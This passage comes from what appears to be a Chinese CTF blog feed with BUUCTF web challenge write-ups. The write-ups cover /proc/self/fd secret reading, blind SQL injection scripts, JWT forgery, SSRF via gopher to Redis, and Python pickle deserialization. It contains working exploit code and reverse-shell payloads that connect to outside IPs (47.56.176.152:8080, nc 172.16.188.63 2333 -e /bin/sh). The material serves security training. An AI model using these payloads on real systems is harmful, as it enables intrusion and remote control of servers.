operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> use_reloader<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>重点代码在/no_one_know_the_manager路由这</p><p>若传入参数key与/tmp/secret.txt中的SECRET_KEY一致，则执行传入的shell参数。</p><p>但可以看到</p><pre><code>os.remove(SECRET_FILE)</code></pre><p>执行时，secret.txt已经被删掉了。但它是用open打开的，在打开时会创建文件描述符。</p><p>可以从/proc/self/fd读文件内容。</p><pre><code>?url=../../../../../../proc/self/fd/3</code></pre><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015215917291.png" srcset="/img/loading.gif" alt="image-20201015215917291"></p><p>传参key和shell,回显ok，但不回显命令执行的结果。进行反弹shell。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015220654731.png" srcset="/img/loading.gif" alt="image-20201015220654731"></p><p>payload</p><pre class=" language-python"><code class="language-python"><span class="token operator">/</span>no_one_know_the_manager?key<span class="token operator">=</span><span class="token number">608b8a425ae3a1f6d7e9426582804b8a</span><span class="token operator">&amp;</span>shell<span class="token operator">=</span>python2<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>27import<span class="token operator">%</span>20socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">%</span>3dsocket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">2247.56</span><span class="token punctuation">.</span><span class="token number">176.152</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span>20os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">%</span>3dsubprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>shell<span class="token operator">%</span>3dTrue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">27</span></code></pre><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015233736978.png" srcset="/img/loading.gif" alt="image-20201015233736978"></p><p>反弹成功，根目录下读flag。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201015233713962.png" srcset="/img/loading.gif" alt="image-20201015233713962"></p><h1 id="CISCN-2019-华北赛区-Day2-Web-Web1"><a href="#CISCN-2019-华北赛区-Day2-Web-Web1" class="headerlink" title="CISCN-2019-华北赛区-Day2-Web-Web1"></a>CISCN-2019-华北赛区-Day2-Web-Web1</h1><p>进来页面就说表和列都给你了，试了一下还存在过滤。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201016155344544.png" srcset="/img/loading.gif" alt="image-20201016155344544"></p><p>fuzz一下看还有哪些被ban了。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201016155309484.png" srcset="/img/loading.gif" alt="image-20201016155309484"></p><p>输入1，2有不同的回显</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201016152644448.png" srcset="/img/loading.gif" alt="image-20201016152644448"></p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201016152707776.png" srcset="/img/loading.gif" alt="image-20201016152707776"></p><p>其他数字是这个回显</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201016153026320.png" srcset="/img/loading.gif" alt="image-20201016153026320"></p><p>其他字符是返回布尔false</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20201016152907399.png" srcset="/img/loading.gif" alt="image-20201016152907399"></p><p>那应该就是布尔盲注了。</p><p>脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://challenge-1a9f9c5c110d52bb.sandbox.ctfhub.com:10080/index.php'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>      <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0'</span><span class="token punctuation">,</span>      <span class="token string">'Accept'</span><span class="token punctuation">:</span><span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>      <span class="token string">'Connection'</span><span class="token punctuation">:</span><span class="token string">'keep-alive'</span>    <span class="token punctuation">}</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'id'</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">}</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    start<span class="token operator">=</span><span class="token number">31</span>    end<span class="token operator">=</span><span class="token number">130</span>    mid<span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token operator">+</span>end<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> start<span class="token operator">&lt;</span>end<span class="token punctuation">:</span>               <span class="token keyword">print</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#time.sleep(1)</span>        data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0^(ascii(substr((select(flag)from(flag)),{0},1))>{1})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            start<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            end<span class="token operator">=</span>mid        mid<span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token operator">+</span>end<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>ctfweb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF WEB wp2</title>
    <link href="/2021/01/07/BUUCTFwp2/"/>
    <url>/2021/01/07/BUUCTFwp2/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p><strong>考点：JWT伪造，PYTHON反序列化</strong></p><a id="more"></a><p>点进来是个商店，看这意思是要买lv6的东西。翻了几页找不到lv6。</p><p>那写个脚本找找Lv6。</p><p>除此之外还有登录注册。随便注册一个用户进来，余额1000。<img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221151101173.png" srcset="/img/loading.gif" alt="image-20201221151101173"></p><p>跑着脚本的期间看看购买的包。两个值得注意的点，一个是JWT,那就意味着可能可以通过伪造JWT登入管理员用户。另一个是传参中的price和discount,可以尝试是否可以通过更改他们改变价格。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221150055193.png" srcset="/img/loading.gif" alt="image-20201221150055193"></p><p>这时候脚本也跑出来了，在181页。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221150022912.png" srcset="/img/loading.gif" alt="image-20201221150022912"></p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221150342904.png" srcset="/img/loading.gif" alt="image-20201221150342904"></p><p>抓这个的包，尝试后发现改discount可行。得到新页面/b1g_m4mber</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221151339495.png" srcset="/img/loading.gif" alt="image-20201221151339495"></p><p>访问，要求admin权限。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221151640156.png" srcset="/img/loading.gif" alt="image-20201221151640156"></p><p>那就正好jwt改改。</p><p>爆一下密码1Kun。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221153737776.png" srcset="/img/loading.gif" alt="image-20201221153737776"></p><p>得到新的JWT。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154046663.png" srcset="/img/loading.gif" alt="image-20201221154046663"></p><p>传入JWT进来了。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154350466.png" srcset="/img/loading.gif" alt="image-20201221154350466"></p><p>进个人中心得到新hint。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154538548.png" srcset="/img/loading.gif" alt="image-20201221154538548"></p><p>解码，说是有后门。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154527108.png" srcset="/img/loading.gif" alt="image-20201221154527108"></p><p>点点成为大会员，抓个包。程序员跑路前留下了源码。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154901468.png" srcset="/img/loading.gif" alt="image-20201221154901468"></p><p>翻翻源码，在Admin.py里发现了序列化</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>        p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('ls /').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag.txt').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> a<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>payload <span class="token operator">=</span> c__builtin__<span class="token operator">%</span>0Aeval<span class="token operator">%</span>0Ap0<span class="token operator">%</span><span class="token number">0A</span><span class="token operator">%</span>28S<span class="token operator">%</span>22__import__<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27os<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>popen<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27ls<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>read<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>0Ap1<span class="token operator">%</span>0Atp2<span class="token operator">%</span>0ARp3<span class="token operator">%</span><span class="token number">0A</span><span class="token punctuation">.</span>payload <span class="token operator">=</span> c__builtin__<span class="token operator">%</span>0Aeval<span class="token operator">%</span>0Ap0<span class="token operator">%</span><span class="token number">0A</span><span class="token operator">%</span>28S<span class="token operator">%</span>22__import__<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27os<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>popen<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>read<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>0Ap1<span class="token operator">%</span>0Atp2<span class="token operator">%</span>0ARp3<span class="token operator">%</span><span class="token number">0A</span><span class="token punctuation">.</span></code></pre><p>向become传入payload,得到flag。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210105183423284.png" srcset="/img/loading.gif" alt="image-20210105183423284"></p><h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h1><p><strong>考点：python反序列化</strong></p><p>题目就告诉是pickle了。</p><p>进来是一个商店，还是熟悉的钱不够买东西环节。</p><p>抓个包看一下。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210105184925755.png" srcset="/img/loading.gif" alt="image-20210105184925755"></p><p>解一下这里的session，本来想着看能不能改下money，但可以看到这里的anit_tamper_hmac就是为了防止数据被篡改。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210105210545805.png" srcset="/img/loading.gif" alt="image-20210105210545805"></p><p>再加上没有源码，这里直接选择利用python反序列化反弹shell。</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').system('nc 172.16.188.63 2333 -e/bin/sh')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>得到payload</p><pre><code>Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3Mi4xNi4xODguNjMgMjMzMyAtZS9iaW4vc2gnKSIKcDEKdHAyClJwMwou</code></pre><p>payload传入session</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107185939246.png" srcset="/img/loading.gif" alt="image-20210107185939246"></p><p>直接cat flag</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107190002376.png" srcset="/img/loading.gif" alt="image-20210107190002376"></p><h1 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h1><p>进来看见这个贴图，说自己是元素大师，一共有118种元素。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107191830284.png" srcset="/img/loading.gif" alt="image-20210107191830284"></p><p>百度了一下，原来是化学元素。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107192055689.png" srcset="/img/loading.gif" alt="image-20210107192055689"></p><p>查看源码，发现两个十六进制字符串。转一下是Po和.php。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107192149655.png" srcset="/img/loading.gif" alt="image-20210107192149655"></p><p>访问一下，内容却只有一个.</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107192507699.png" srcset="/img/loading.gif" alt="image-20210107192507699"></p><p>先试试其他元素的页面有没有回显。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107194107338.png" srcset="/img/loading.gif" alt="image-20210107194107338"></p><p>确实是有的，那把这些页面的回显拼起来就可以了。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://acc3a451-dabc-4062-ac0a-b261302de6ac.node3.buuoj.cn/'</span>flag<span class="token operator">=</span><span class="token string">''</span>dict1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'He'</span><span class="token punctuation">,</span> <span class="token string">'Li'</span><span class="token punctuation">,</span> <span class="token string">'Be'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'Ne'</span><span class="token punctuation">,</span> <span class="token string">'Na'</span><span class="token punctuation">,</span> <span class="token string">'Mg'</span><span class="token punctuation">,</span> <span class="token string">'Al'</span><span class="token punctuation">,</span> <span class="token string">'Si'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'Cl'</span><span class="token punctuation">,</span> <span class="token string">'Ar'</span><span class="token punctuation">,</span>        <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'Ca'</span><span class="token punctuation">,</span> <span class="token string">'Sc'</span><span class="token punctuation">,</span> <span class="token string">'Ti'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'Cr'</span><span class="token punctuation">,</span> <span class="token string">'Mn'</span><span class="token punctuation">,</span> <span class="token string">'Fe'</span><span class="token punctuation">,</span> <span class="token string">'Co'</span><span class="token punctuation">,</span> <span class="token string">'Ni'</span><span class="token punctuation">,</span> <span class="token string">'Cu'</span><span class="token punctuation">,</span> <span class="token string">'Zn'</span><span class="token punctuation">,</span> <span class="token string">'Ga'</span><span class="token punctuation">,</span> <span class="token string">'Ge'</span><span class="token punctuation">,</span> <span class="token string">'As'</span><span class="token punctuation">,</span> <span class="token string">'Se'</span><span class="token punctuation">,</span> <span class="token string">'Br'</span><span class="token punctuation">,</span>        <span class="token string">'Kr'</span><span class="token punctuation">,</span> <span class="token string">'Rb'</span><span class="token punctuation">,</span> <span class="token string">'Sr'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'Zr'</span><span class="token punctuation">,</span> <span class="token string">'Nb'</span><span class="token punctuation">,</span> <span class="token string">'Mo'</span><span class="token punctuation">,</span> <span class="token string">'Te'</span><span class="token punctuation">,</span> <span class="token string">'Ru'</span><span class="token punctuation">,</span> <span class="token string">'Rh'</span><span class="token punctuation">,</span> <span class="token string">'Pd'</span><span class="token punctuation">,</span> <span class="token string">'Ag'</span><span class="token punctuation">,</span> <span class="token string">'Cd'</span><span class="token punctuation">,</span> <span class="token string">'In'</span><span class="token punctuation">,</span> <span class="token string">'Sn'</span><span class="token punctuation">,</span> <span class="token string">'Sb'</span><span class="token punctuation">,</span> <span class="token string">'Te'</span><span class="token punctuation">,</span>        <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'Xe'</span><span class="token punctuation">,</span> <span class="token string">'Cs'</span><span class="token punctuation">,</span> <span class="token string">'Ba'</span><span class="token punctuation">,</span> <span class="token string">'La'</span><span class="token punctuation">,</span> <span class="token string">'Ce'</span><span class="token punctuation">,</span> <span class="token string">'Pr'</span><span class="token punctuation">,</span> <span class="token string">'Nd'</span><span class="token punctuation">,</span> <span class="token string">'Pm'</span><span class="token punctuation">,</span> <span class="token string">'Sm'</span><span class="token punctuation">,</span> <span class="token string">'Eu'</span><span class="token punctuation">,</span> <span class="token string">'Gd'</span><span class="token punctuation">,</span> <span class="token string">'Tb'</span><span class="token punctuation">,</span> <span class="token string">'Dy'</span><span class="token punctuation">,</span> <span class="token string">'Ho'</span><span class="token punctuation">,</span> <span class="token string">'Er'</span><span class="token punctuation">,</span> <span class="token string">'Tm'</span><span class="token punctuation">,</span>        <span class="token string">'Yb'</span><span class="token punctuation">,</span> <span class="token string">'Lu'</span><span class="token punctuation">,</span> <span class="token string">'Hf'</span><span class="token punctuation">,</span> <span class="token string">'Ta'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'Re'</span><span class="token punctuation">,</span> <span class="token string">'Os'</span><span class="token punctuation">,</span> <span class="token string">'Ir'</span><span class="token punctuation">,</span> <span class="token string">'Pt'</span><span class="token punctuation">,</span> <span class="token string">'Au'</span><span class="token punctuation">,</span> <span class="token string">'Hg'</span><span class="token punctuation">,</span> <span class="token string">'Tl'</span><span class="token punctuation">,</span> <span class="token string">'Pb'</span><span class="token punctuation">,</span> <span class="token string">'Bi'</span><span class="token punctuation">,</span> <span class="token string">'Po'</span><span class="token punctuation">,</span> <span class="token string">'At'</span><span class="token punctuation">,</span> <span class="token string">'Rn'</span><span class="token punctuation">,</span>        <span class="token string">'Fr'</span><span class="token punctuation">,</span> <span class="token string">'Ra'</span><span class="token punctuation">,</span> <span class="token string">'Ac'</span><span class="token punctuation">,</span> <span class="token string">'Th'</span><span class="token punctuation">,</span> <span class="token string">'Pa'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'Np'</span><span class="token punctuation">,</span> <span class="token string">'Pu'</span><span class="token punctuation">,</span> <span class="token string">'Am'</span><span class="token punctuation">,</span> <span class="token string">'Cm'</span><span class="token punctuation">,</span> <span class="token string">'Bk'</span><span class="token punctuation">,</span> <span class="token string">'Cf'</span><span class="token punctuation">,</span> <span class="token string">'Es'</span><span class="token punctuation">,</span> <span class="token string">'Fm'</span><span class="token punctuation">,</span><span class="token string">'Md'</span><span class="token punctuation">,</span> <span class="token string">'No'</span><span class="token punctuation">,</span> <span class="token string">'Lr'</span><span class="token punctuation">,</span>        <span class="token string">'Rf'</span><span class="token punctuation">,</span> <span class="token string">'Db'</span><span class="token punctuation">,</span> <span class="token string">'Sg'</span><span class="token punctuation">,</span> <span class="token string">'Bh'</span><span class="token punctuation">,</span> <span class="token string">'Hs'</span><span class="token punctuation">,</span> <span class="token string">'Mt'</span><span class="token punctuation">,</span> <span class="token string">'Ds'</span><span class="token punctuation">,</span> <span class="token string">'Rg'</span><span class="token punctuation">,</span> <span class="token string">'Cn'</span><span class="token punctuation">,</span> <span class="token string">'Nh'</span><span class="token punctuation">,</span> <span class="token string">'Fl'</span><span class="token punctuation">,</span> <span class="token string">'Mc'</span><span class="token punctuation">,</span> <span class="token string">'Lv'</span><span class="token punctuation">,</span> <span class="token string">'Ts'</span><span class="token punctuation">,</span> <span class="token string">'Og'</span><span class="token punctuation">,</span> <span class="token string">'Uue'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> dict1<span class="token punctuation">:</span>    urls<span class="token operator">=</span>url <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'.php'</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        flag<span class="token operator">+=</span>r<span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>得到页面。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107195612739.png" srcset="/img/loading.gif" alt="image-20210107195612739"></p><p>访问得flag。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107195633082.png" srcset="/img/loading.gif" alt="image-20210107195633082"></p><h1 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h1><p><strong>考点：gopher攻击redis</strong></p><p>进来是一个可以输url的界面，参数是url和submit，功能就是跳转页面。先尝试一下127.0.0.1，回显别这样，应该是存在过滤。考虑是否存在ssrf。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107220746121.png" srcset="/img/loading.gif" alt="image-20210107220746121"></p><p>查看源码发现hint。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107222928870.png" srcset="/img/loading.gif" alt="image-20210107222928870"></p><p>访问一下。泄露了网卡信息。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108131829495.png" srcset="/img/loading.gif" alt="image-20210108131829495"></p><p>读下index.php的源码，测试中发现file被过滤，用file:/ 绕过。</p><pre><code>file: /var/www/html/index.php</code></pre><p>源码如下,过滤了file,dict,127.0.0.1和localhost。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107233058451.png" srcset="/img/loading.gif" alt="image-20210107233058451"></p><p>扫一下内网存活主机。</p><p>这个主机给了个提示。说是端口有问题。那就接着扫下端口。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108144326454.png" srcset="/img/loading.gif" alt="image-20210108144326454"></p><p>扫到6379，redis端口。用Gopherus生成payload。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108161614967.png" srcset="/img/loading.gif" alt="image-20210108161614967"></p><p>传payload</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108161652804.png" srcset="/img/loading.gif" alt="image-20210108161652804"></p><p>访问shell.php,有回显了。</p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108161741846.png" srcset="/img/loading.gif" alt="image-20210108161741846"></p><p>然后直接用ls /,和cat /flag得到flag。</p><p><img 